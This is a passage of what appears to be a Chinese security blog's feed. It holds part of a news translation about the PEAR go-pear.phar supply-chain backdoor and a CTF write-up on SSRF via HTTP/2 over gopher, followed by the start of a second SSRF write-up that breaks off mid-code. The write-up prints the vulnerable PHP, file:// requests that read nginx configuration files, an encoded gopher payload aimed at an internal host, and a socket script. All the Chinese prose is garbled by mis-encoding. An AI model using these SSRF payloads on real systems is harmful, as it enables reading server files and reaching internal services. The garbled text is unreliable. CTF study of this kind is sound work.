pearweb_pharsÔºâ</code>Ëé∑ÂèñÁõ∏ÂêåÂèëË°åÁâàÊú¨ÁöÑÊñ∞ÂâØÊú¨Âπ∂ÊØîËæÉÂÖ∂Êñá‰ª∂ÂìàÂ∏åÂÄº„ÄÇÂ¶ÇÊûú‰∏çÂêåÔºåÊÇ®ÂèØËÉΩ‰ºöÊúâÂÆâË£ÖÂèóÊÑüÊüìÁöÑÊñá‰ª∂ÁöÑÈ£éÈô©‚ÄùÔºåPEARÂÆòÊñπÁΩëÁ´ô‰∏äÁöÑËØ¥ÊòéÂ¶Ç‰∏ä„ÄÇ</p></blockquote><p>Ê†πÊçÆPEARÁª¥Êä§‰∫∫ÂëòÁöÑËØ¥Ê≥ïÔºåËØ•Âõ¢ÈòüÁõÆÂâçÊ≠£Âú®ËøõË°åËøΩË∏™„ÄÅÊ∫ØÊ∫êË∞ÉÊü•Ôºå‰ª•Á°ÆÂÆöÊîªÂáªÁöÑÁ®ãÂ∫¶‰ª•ÂèäÊîªÂáªËÄÖÊòØÂ¶Ç‰ΩïÂú®Ëøô‰πàÊó©ÁöÑÊó∂ÊúüÂ∞±ËÉΩÂ§üÊîªÁ†¥ÊúçÂä°Âô®„ÄÇ</p><p>ËÄåÁé∞Âú®ÂèØ‰ª•Âú®Github‰∏äËé∑ÂèñÂà∞ÂáÄÂåñÂêéÁöÑÁâàÊú¨<code>pearweb_phars-1.10.10</code>ÔºåÊ≠§ÂâçÂú®ÊúçÂä°Âô®<code>httpÔºö//pear.php.net</code>‰∏äÂèóÂà∞Ê±°ÊüìÁöÑÁâàÊú¨ÊòØ<code>v1.10.9</code>ÔºåPEARÂõ¢Èòü‰πüÈáçÊñ∞ÂèëÂ∏É‰∫ÜÊú™ÂèóÊ±°ÊüìÁöÑ<code>go-pear.phar-v1.10.9</code>ÔºåÂπ∂‰∏î‰ºöÂåÖÂê´ÊúâÊØè‰∏™‰∏çÂêå<code>phar</code>ÁöÑÂçïÁã¨GPGÁ≠æÂêçÊñá‰ª∂ÔºåÁî®‰ª•È™åÊòéÂÖ∂Ê≠£Á°ÆÊÄß„ÄÇ</p><p>ÂêéÊù•ÂºÄÂèë‰∫∫ÂëòËøõË°å‰∫ÜËøõ‰∏ÄÊ≠•ÁöÑÈÄöÁü•ËØ¥ÊòéÔºåËØÅÂÆûÂè™Êúâ<code>http://pear.php.net</code>ÊúçÂä°Âô®‰∏äÁöÑÂâØÊú¨ÂèóÂà∞‰∫ÜÂΩ±ÂìçÔºåËÄå‰∏î<code>go-pear.phar</code>ÁöÑGitHubÂâØÊú¨Âπ∂Ê≤°ÊúâÊõøÊç¢‰∏∫Ê±°ÊüìÂêéÁöÑÊñá‰ª∂„ÄÇ</p><p>Âõ†Ê≠§ÊâÄÊúâÂú®ËøáÂéªÂÖ≠‰∏™ÊúàÂÜÖ‰ªéÂÆòÊñπÁΩëÁ´ô‰∏ãËΩΩËøáÂÆâË£ÖÊñá‰ª∂<code>go-pear.phar</code>ÁöÑPHP / PEARÁî®Êà∑<strong>ÈÉΩÂ∫îËØ•ËÆ§ËØÜ</strong>Âà∞Ëá™Â∑±ÊúâË¢´ÈªëÂÆ¢‰æµÂÆ≥ÁöÑÈ£éÈô©ÔºåÂπ∂‰∏îÊúÄÂ•ΩÊõøÊç¢Êñá‰ª∂‰∏∫Github‰∏äÁöÑÁ∫ØÂáÄÁâàÊú¨„ÄÇ</p><h2 id="PEAR-Âõ¢ÈòüÈíàÂØπÊ≠§Ê¨°‰æõÂ∫îÈìæÊ±°ÊüìÁöÑÈÉ®ÂàÜË∞ÉÊü•‰ø°ÊÅØ"><a href="#PEAR-Âõ¢ÈòüÈíàÂØπÊ≠§Ê¨°‰æõÂ∫îÈìæÊ±°ÊüìÁöÑÈÉ®ÂàÜË∞ÉÊü•‰ø°ÊÅØ" class="headerlink" title="PEAR Âõ¢ÈòüÈíàÂØπÊ≠§Ê¨°‰æõÂ∫îÈìæÊ±°ÊüìÁöÑÈÉ®ÂàÜË∞ÉÊü•‰ø°ÊÅØ"></a>PEAR Âõ¢ÈòüÈíàÂØπÊ≠§Ê¨°‰æõÂ∫îÈìæÊ±°ÊüìÁöÑÈÉ®ÂàÜË∞ÉÊü•‰ø°ÊÅØ</h2><p><strong>Êõ¥Êñ∞</strong> -  PEARÂõ¢ÈòüÂèëÂ∏É‰∫ÜÊúâÂÖ≥ÊúÄËøëÂÆâÂÖ®‰∫ã‰ª∂ÁöÑÊõ¥Â§öËØ¶ÁªÜ‰ø°ÊÅØÔºåËß£Èáä‰∫ÜÂú®2018Âπ¥12Êúà20Êó•ÊúÄÂêé‰∏ÄÊ¨°Ê≠£ÂºèÊñá‰ª∂ÂèëÂ∏ÉÂêéÔºåÂÖ∂ÊúçÂä°Âô®‰∏äÂèëÁé∞<code>go-pear.phar</code>Ë¢´Ê±°ÊüìÁöÑËØ¶ÁªÜÁä∂ÂÜµ„ÄÇ</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190130111806.png" alt=""></p><p>PEAR Âõ¢ÈòüÂú®ÂàÜÊûê‰∫ÜÂåÖÁÆ°ÁêÜÂô®ÁöÑÊ±°ÊüìÁâàÊú¨Êñá‰ª∂‰πãÂêéÔºåÂèëÁé∞ÊÅ∂ÊÑè‰ª£Á†ÅÊ®°Âùó<code>ÈÄöËøáPerlÂêëIP 104.131.154.154ÁîüÊàêÂèçÂêëshell</code>ÔºåËøôÊÑèÂë≥ÁùÄÂèóÊÑüÊüìÁöÑÊúçÂä°Âô®Â∞ÜÁîüÊàêÂêéÈó®ÔºåÂÖÅËÆ∏ÊîªÂáªËÄÖÂÆåÂÖ®ÊéßÂà∂ÂÆÉ‰ª¨ÔºåÂåÖÊã¨ÂÆâË£ÖÂ∫îÁî®Á®ãÂ∫èÔºåËøêË°åÊÅ∂ÊÑè‰ª£Á†ÅÔºåÁ™ÉÂèñÊïèÊÑüÊï∞ÊçÆÁöÑËÉΩÂäõ„ÄÇ</p><p>Ê†πÊçÆ<a href="https://blog.dcso.de/php-pear-software-supply-chain-attack/" target="_blank" rel="noopener">DCSO‰∏äÂæ∑ÂõΩÁΩëÁªúÂÆâÂÖ®ÁªÑÁªáÂØπÊ≠§Ê¨°‰æõÂ∫îÈìæÊ±°ÊüìÁöÑÂàÜÊûêÊä•Âëä</a>ÂæóÁü•ÔºöÊúçÂä°Âô®IPÂú∞ÂùÄ<code>104.131.154.154</code>ÊåáÂêë‰∏Ä‰∏™webÂüüÂêç<code>bestlinuxgames [.] com</code>ÔºåËØ•ÊúçÂä°Âô®Ë¢´ËÆ§‰∏∫ÊòØÈªëÂÆ¢‰ΩøÁî®ÁöÑ‰∏ÄÂè∞ÂèóÊÑüÊüìÂêé‰∏ªÊú∫ÔºàËÇâÈ∏°/C2ÊúçÂä°Âô®Ôºâ„ÄÇ</p><blockquote><p>‚ÄúËØ•IPÂ∑≤Ë¢´ËØÅÂÆû‰∏éÊ≠§Ê¨°‰æõÂ∫îÈìæÊ±°ÊüìÊúâÂÖ≥Ôºå‰ΩÜÊ≤°ÊúâÂèëÁé∞ÂÖ∂‰ªñËøùËßÑË°å‰∏∫„ÄÇ<code>install-pear-nozlib.phar</code>ËΩØ‰ª∂ÂåÖÊòØÊ≠£Â∏∏ÁöÑÔºåGitHub‰∏äÁöÑ<code>go-pear.phar</code>Êñá‰ª∂‰πüÊòØÊ≠£Â∏∏ÁöÑÔºåÂèØ‰ª•Â∞Ü‰ªª‰ΩïÂèØÁñëÁöÑÊ†∑Êú¨ÂìàÂ∏å‰∏éÊ≠£Á°ÆÁöÑMD5ÂÄºËøõË°åÊ†°È™å„ÄÇ‚ÄùÔºõ</p><p>‚ÄúÂõ†Ê≠§ÔºåÂÅáÂ¶ÇÊÇ®Âú®12/20‰πãÂâç‰∏ãËΩΩ‰∫Ü<code>go-pear.phar</code>Áî®‰ª•Âú®ÊÇ®ÁöÑÁ≥ªÁªü‰∏äÂÆâË£ÖPEARÂåÖÔºåÈÇ£‰πàÊÇ®<strong>Â∫îËØ•ÊãÖÂøÉ</strong>Ëá™Â∑±ÊòØÂê¶‰ºöÊàê‰∏∫ËÇâÈ∏°ÔºåÁâπÂà´ÊòØÂΩìÊÇ®ÁöÑÁ≥ªÁªüÂÖ∑ÊúâÂèØÁî®ÁöÑ<code>sh</code>Âíå<code>perl</code>ÁöÑÊó∂ÂÄôÔºåÊàë‰ª¨Âπ∂Ê≤°ÊúâÂÖ∑‰ΩìËØÅÊçÆÂéªÁ°ÆËÆ§ÊÇ®ÊòØÂê¶‰∏ãËΩΩ‰∫ÜË¢´ÊÑüÊüìÁöÑÊñá‰ª∂Ôºå‰ΩÜ‰øùÈô©Ëµ∑ËßÅËøòÊòØÂ∏åÊúõÊÇ®ËÉΩÂ•ΩÂ•ΩÊ£ÄÊü•‰∏Ä‰∏ãÊÇ®ÁöÑÁ≥ªÁªü„ÄÇ‚ÄùÔºõ</p><p>‚ÄúÂè¶Â§ñËøòÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåËøô‰∏ç‰ºöÊ±°Êüì‰ΩøÁî®PEARÂÆâË£ÖÁöÑÁ®ãÂ∫èÂåÖ‚Ä¶ÂÆÉÊ±°ÊüìÁöÑÊòØÂàùÂßãÂÆâË£ÖPEARÂÆâË£ÖÁ®ãÂ∫èÁöÑ<code>go-pear.phar</code>ÂèØÊâßË°åÊñá‰ª∂ÔºåÂç≥‰ΩøÁî®<code>pear</code>ÂëΩ‰ª§ÂÆâË£ÖÁöÑÂêÑÁßçPEARÂåÖ<strong>‰∏çÂèó</strong>ÂΩ±Âìç„ÄÇ‚ÄùÔºõ</p><p>PEAR Âõ¢ÈòüÂú®‰∏ÄÁ≥ªÂàóÊé®Êñá‰∏≠ÁöÑË°®Á§∫Â¶Ç‰∏ä„ÄÇ</p></blockquote><p>PSÔºöÂΩì‰ªäÁöÑ‰æõÂ∫îÈìæÊ±°Êüì‰∫ã‰ª∂Ë∂äÊù•Ë∂äÂ§öÔºåË∞®ÊÖéÂ∞èÂøÉÊñπËÉΩÈ©∂Âæó‰∏áÂπ¥Ëàπ„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> ËØëÊñá </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ÁΩëÁªúÂÆâÂÖ® </tag>
            
            <tag> ËµÑËÆØ </tag>
            
            <tag> ËØëÊñá </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ssrf_by_http2_and_gopher</title>
      <link href="/2019/01/31/ssrf-by-http2-and-gopher/"/>
      <url>/2019/01/31/ssrf-by-http2-and-gopher/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="pwnhub-pink-friend"><a href="#pwnhub-pink-friend" class="headerlink" title="pwnhub-pink-friend"></a>pwnhub-pink-friend</h1><blockquote><p>ÂèÇËÄÉÈìæÊé•Ôºö</p><p><a href="http://f1sh.site/2019/01/30/pwnhub-pink-friend-writeup/" target="_blank" rel="noopener">http://f1sh.site/2019/01/30/pwnhub-pink-friend-writeup/</a></p><p><a href="https://www.virzz.com/2019/01/29/pwnhub_2019_pink_friend_http2.html" target="_blank" rel="noopener">https://www.virzz.com/2019/01/29/pwnhub_2019_pink_friend_http2.html</a></p></blockquote><p>È¢òÁõÆÈìæÊé•Ôºö<a href="https://40.73.33.181/index.php" target="_blank" rel="noopener">https://40.73.33.181/index.php</a></p><p>source code:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Can not parse url: '</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span> <span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>ÂÖàssrfËØªnginxÈÖçÁΩÆÊñá‰ª∂Ôºö</p><ul><li>/etc/nginx/nginx.conf</li><li>/etc/nginx/sites-enabled/default</li><li>/var/log/nginx/access.log;</li><li>/var/log/nginx/error.log</li></ul><p><code>view-source:https://40.73.33.181/index.php?url=file:///etc/nginx/sites-enabled/default</code></p><p><code>view-source:https://40.73.33.181/index.php?url=file:///etc/nginx/nginx.conf</code></p><pre class=" language-nginx"><code class="language-nginx"><span class="token keyword">user</span> www<span class="token operator">-</span>data<span class="token punctuation">;</span><span class="token keyword">worker_processes</span> auto<span class="token punctuation">;</span><span class="token keyword">pid</span> <span class="token operator">/</span>run<span class="token operator">/</span>nginx<span class="token punctuation">.</span><span class="token keyword">pid</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>modules<span class="token operator">-</span>enabled<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span>conf<span class="token punctuation">;</span><span class="token keyword">events</span> <span class="token punctuation">{</span>    <span class="token keyword">worker_connections</span> <span class="token number">768</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># multi_accept on;</span><span class="token punctuation">}</span><span class="token keyword">http</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Basic Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">sendfile</span> on<span class="token punctuation">;</span>    <span class="token keyword">tcp_nopush</span> on<span class="token punctuation">;</span>    <span class="token keyword">tcp_nodelay</span> on<span class="token punctuation">;</span>    <span class="token keyword">keepalive_timeout</span> <span class="token number">65</span><span class="token punctuation">;</span>    <span class="token keyword">types_hash_max_size</span> <span class="token number">2048</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># server_tokens off;</span>    <span class="token comment" spellcheck="true"># server_names_hash_bucket_size 64;</span>    <span class="token comment" spellcheck="true"># server_name_in_redirect off;</span>    <span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>mime<span class="token punctuation">.</span><span class="token keyword">types</span><span class="token punctuation">;</span>    <span class="token keyword">default_type</span> application<span class="token operator">/</span>octet<span class="token operator">-</span>stream<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># SSL Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">ssl_protocols</span> TLSv1 TLSv1<span class="token number">.1</span> TLSv1<span class="token number">.2</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true"># Dropping SSLv3, ref: POODLE</span>    <span class="token keyword">ssl_prefer_server_ciphers</span> on<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Logging Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">access_log</span> <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>access<span class="token punctuation">.</span>log<span class="token punctuation">;</span>    <span class="token keyword">error_log</span> <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>error<span class="token punctuation">.</span>log<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Gzip Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">gzip</span> on<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># gzip_vary on;</span>    <span class="token comment" spellcheck="true"># gzip_proxied any;</span>    <span class="token comment" spellcheck="true"># gzip_comp_level 6;</span>    <span class="token comment" spellcheck="true"># gzip_buffers 16 8k;</span>    <span class="token comment" spellcheck="true"># gzip_http_version 1.1;</span>    <span class="token comment" spellcheck="true"># gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Virtual Host Configs</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>conf<span class="token punctuation">.</span>d<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span>conf<span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>sites<span class="token operator">-</span>enabled<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#server {</span>    <span class="token comment" spellcheck="true">#    listen 8080</span>    <span class="token comment" spellcheck="true">#    location /flag {</span>    <span class="token comment" spellcheck="true">#        proxy_pass 172.20.0.3:8080</span>    <span class="token comment" spellcheck="true">#    }</span>    <span class="token comment" spellcheck="true">#}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#mail {</span><span class="token comment" spellcheck="true">#    # See sample authentication script at:</span><span class="token comment" spellcheck="true">#    # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true">#    # auth_http localhost/auth.php;</span><span class="token comment" spellcheck="true">#    # pop3_capabilities "TOP" "USER";</span><span class="token comment" spellcheck="true">#    # imap_capabilities "IMAP4rev1" "UIDPLUS";</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true">#    server {</span><span class="token comment" spellcheck="true">#        listen     localhost:110;</span><span class="token comment" spellcheck="true">#        protocol   pop3;</span><span class="token comment" spellcheck="true">#        proxy      on;</span><span class="token comment" spellcheck="true">#    }</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true">#    server {</span><span class="token comment" spellcheck="true">#        listen     localhost:143;</span><span class="token comment" spellcheck="true">#        protocol   imap;</span><span class="token comment" spellcheck="true">#        proxy      on;</span><span class="token comment" spellcheck="true">#    }</span><span class="token comment" spellcheck="true">#}</span></code></pre><p>ÁÑ∂ÂêéÂèØ‰ª•‰ªénginx.confÂæóÁü•flagÁ∫øÁ¥¢<code>172.20.0.3:8080</code>ÔºåÈÄöËøágopherÂçèËÆÆÊûÑÈÄ†Á¨¶ÂêàHTTP2ÁöÑpayloadËÆøÈóÆÊåáÂÆöÂú∞ÂùÄÔºåËé∑ÂèñËøîÂõûÁöÑHTTP2ÁöÑÂéüÁîüÊï∞ÊçÆÔºàÈúÄË¶Å‰∫ÜËß£<a href="https://www.codercto.com/a/34433.html" target="_blank" rel="noopener">HTTP2</a>‰ª•Âèä<a href="https://www.codercto.com/a/34433.html" target="_blank" rel="noopener">gopherÂçèËÆÆ</a>ÁöÑÁü•ËØÜÔºâ„ÄÇ</p><pre class=" language-payload"><code class="language-payload">--payload:/index.php?url=gopher://172.20.0.3:8080/_PRI%2520%252A%2520HTTP/2.0%250D%250A%250D%250ASM%250D%250A%250D%250A%2500%2500%2500%2504%2500%2500%2500%2500%2500%2500%2500%2515%2501%2505%2500%2500%2500%2501%2582%2586%2584A%258A%2508%259D%255C%250B%2581p%25DCx%250F%2503%2560%2581%25EFS%2581%25F9</code></pre><p>ËøîÂõûÁöÑÊï∞ÊçÆ:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190131000835.png" alt=""></p><p>ÂèØ‰ª•Â∞ÜËøîÂõûÁöÑÊï∞ÊçÆÊåâHTTP2ÂçèËÆÆÁöÑÊ†ºÂºèËß£ÊûêÔºåÊàñËÄÖÂà©Áî®‰∏ÄÁßçÂ∑ßÂ¶ôÁöÑÊñπÊ≥ïÔºåÂç≥ÊääËøîÂõûÊï∞ÊçÆÊîæÂú®‰ΩøÁî®socketÊ®°ÊãüÁöÑÊúçÂä°Âô®‰∏äÔºåÁõ¥Êé•Áî®<code>curl --http2-prior-knowledge</code>ËÆøÈóÆÔºåËé∑ÂæóÂÜôÂú®ËøîÂõûÂ§¥ÈÉ®<code>set-cookie</code>ÁöÑflagÔºö</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: UTF-8 -*-</span><span class="token comment" spellcheck="true"># From F1sh's blog</span><span class="token keyword">import</span> socketa <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"response.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>host <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span>port <span class="token operator">=</span> <span class="token number">2333</span>s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    c<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">'ËøûÊé•Âú∞ÂùÄÔºö'</span><span class="token punctuation">,</span> addr    c<span class="token punctuation">.</span>send<span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre><p>ÊâßË°å<code>curl -vv --http2-prior-knowledge 127.0.0.1:6777 --output -</code>ËøîÂõûÁöÑÊï∞ÊçÆÔºö</p><pre class=" language-response"><code class="language-response">* Rebuilt URL to: 127.0.0.1:6777/*   Trying 127.0.0.1...* TCP_NODELAY set* Connected to 127.0.0.1 (127.0.0.1) port 6777 (#0)* Using HTTP2, server supports multi-use* Connection state changed (HTTP/2 confirmed)* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0* Using Stream ID: 1 (easy handle 0x55d0f3f35520)> GET / HTTP/2> Host: 127.0.0.1:6777> User-Agent: curl/7.61.0> Accept: */*> * Connection state changed (MAX_CONCURRENT_STREAMS == 128)!< HTTP/2 200 < server: nginx/1.14.0 (Ubuntu)< date: Wed, 30 Jan 2019 16:02:53 GMT< content-type: text/html; charset=UTF-8< set-cookie: F1ag:flag{Http2_Mak3_a_Differ3nce}=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0< * Closing connection 0U hav3 g0t Me!!!%                  </code></pre><p>[+] GET==&gt; F1ag:flag{Http2_Mak3_a_Differ3nce}</p>]]></content>
      
      
      <categories>
          
          <category> ÁΩëÁªúÂÆâÂÖ® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf </tag>
            
            <tag> ÁΩëÁªúÂÆâÂÖ® </tag>
            
            <tag> write-up </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ÊüêÂÖ•Áæ§È¢òËß£È¢òËÆ∞ÂΩï</title>
      <link href="/2019/01/29/%E6%9F%90%E5%85%A5%E7%BE%A4%E9%A2%98%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/01/29/%E6%9F%90%E5%85%A5%E7%BE%A4%E9%A2%98%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="ËÆ∞ÊüêÂÖ•Áæ§È¢òËß£È¢òËøáÁ®ã"><a href="#ËÆ∞ÊüêÂÖ•Áæ§È¢òËß£È¢òËøáÁ®ã" class="headerlink" title="ËÆ∞ÊüêÂÖ•Áæ§È¢òËß£È¢òËøáÁ®ã"></a>ËÆ∞ÊüêÂÖ•Áæ§È¢òËß£È¢òËøáÁ®ã</h1><p>Èó≤Êù•Êó†‰∫ãÔºåÁúã‰ºó‰∫∫Á∫∑Á∫∑Âú®Áé©ÂÖ•Áæ§È¢òÔºåÁ∫µ‰ΩøÊàëËèúÁöÑ‰∏çÊï¢Âä®ÊâãÔºå‰πüÊÉ≥Â∞ùËØï‰∏Ä‰∏ã„ÄÇ</p><h2 id="0x01-ËøéÈù¢ËÄåÊù•ÁöÑSSRF"><a href="#0x01-ËøéÈù¢ËÄåÊù•ÁöÑSSRF" class="headerlink" title="0x01 ËøéÈù¢ËÄåÊù•ÁöÑSSRF"></a>0x01 ËøéÈù¢ËÄåÊù•ÁöÑSSRF</h2><p>È¶ñÂÖàËÆøÈóÆÈ¢òÁõÆÂú∞ÂùÄÔºö</p><p><code>index.phpÊ∫êÁ†Å</code></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">check_inner_ip</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$match_result</span><span class="token operator">=</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$match_result</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">try</span>     <span class="token punctuation">{</span>         <span class="token variable">$url_parse</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">catch</span><span class="token punctuation">(</span>Exception <span class="token variable">$e</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token variable">$hostname</span><span class="token operator">=</span><span class="token variable">$url_parse</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token variable">$ip</span><span class="token operator">=</span><span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$hostname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$int_ip</span><span class="token operator">=</span><span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'127.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">||</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'10.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">||</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'172.16.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">20</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">20</span> <span class="token operator">||</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'192.168.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">16</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">16</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check_inner_ip</span><span class="token 